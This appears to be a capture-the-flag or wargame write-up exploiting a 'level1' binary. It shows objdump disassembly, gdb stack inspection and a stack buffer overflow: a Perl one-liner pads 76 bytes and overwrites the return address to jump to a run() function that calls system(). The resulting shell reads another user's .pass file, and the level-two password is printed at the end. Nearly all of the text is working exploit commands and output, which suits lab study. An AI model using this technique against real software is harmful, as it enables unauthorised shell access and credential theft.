$>objdump -M intel -d level1

08048444 <run>:
8048444:	55                   	push   ebp
8048445:	89 e5                	mov    ebp,esp
8048447:	83 ec 18             	sub    esp,0x18
804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
804844f:	89 c2                	mov    edx,eax
8048451:	b8 70 85 04 08       	mov    eax,0x8048570
8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
8048461:	00
8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
8048469:	00
804846a:	89 04 24             	mov    DWORD PTR [esp],eax
804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
804847e:	c9                   	leave
804847f:	c3                   	ret

08048480 <main>:
8048480:	55                   	push   ebp
8048481:	89 e5                	mov    ebp,esp
8048483:	83 e4 f0             	and    esp,0xfffffff0
8048486:	83 ec 50             	sub    esp,0x50
8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
804848d:	89 04 24             	mov    DWORD PTR [esp],eax
8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
8048495:	c9                   	leave

$>gdb level1

(gdb)$>b *0x8048495
(gdb)$>r

Breakpoint 1, 0x08048495 in main ()

(gdb)$>s
(gdb)$>i r $eip

eip            0xb7e454d3	0xb7e454d3 <__libc_start_main+243>

(gdb)$>r

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x08048495 in main ()

(gdb)$>x/28xw $esp

0xbffff6c0:	0xbffff6d0	0x0000002f	0xbffff71c	0xb7fd0ff4
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0xb7e45400 <- addr to return
0xbffff720:	0x00000001	0xbffff7b4	0xbffff7bc	0xb7fdc858

$>`perl -e 'open(my $fh, ">", "toto"); print $fh "\x90"x76 ."\x44\x84\x04\x08" . "\xd3\x54\xe4\xb7"'` ; cat toto - | ./level1
(sh)$>cat /home/user/level2/.pass


"\x44\x84\x04\x08" => addr of run
"\xd3\x54\xe4\xb7" => addr for return of run (for segfault)

password lvl2 : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
